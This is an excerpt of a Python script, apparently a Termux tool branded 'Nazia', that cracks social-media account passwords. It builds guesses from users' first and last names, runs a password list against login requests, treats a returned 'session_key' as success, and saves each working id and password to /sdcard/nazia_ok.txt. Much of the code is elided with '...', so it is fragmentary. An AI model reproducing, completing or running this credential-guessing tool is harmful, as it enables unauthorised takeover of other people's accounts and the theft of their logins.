...
{50*"-"}
    Tool Version :     1.3
    Thanks Alot  :     Nazia hayat Offcile
{50*"-"}'''
...
def main():
        ...
        if menu_opt =='1':
                ...
                xchker()
                os.system('xdg-open https://github.com/Naziahayat/Qnumber')
                main()
        elif menu_opt =='4':
...
class crack_main():
        ...
        def m1(self,iid,name,passlist):
                try:
                        ...
                        sys.stdout.write('\r[Nazia] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
                        fn = name.split(' ')[0]
                        try:
                                ln = name.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in po:
                                        ...
                                        print(' \033[1;32m[Nazia-OK] '+roid+' | '+pas+'\033[0;97m')
                                        open('/sdcard/nazia_ok.txt','a').write(roid+'|'+pas+'\n')
                                        ok.append(iid)
                                        break
                                else:
                                        continue
        ...
        def pasw(self):
                ...
                print(' Ok Ids Save In : /sdcard/nazia_ok.txt')
                print(50*'-')
                input('\n Press enter to back ')
                main()
...
datar = []
datar.append(pat)
if '/data/data/com.termux/files/home/Nazia' in datar:
        pass
else:
        for i in range(5000):
                print(" data is forked / or in other file")
        exit("Type > cd ~ && python nazia.py")
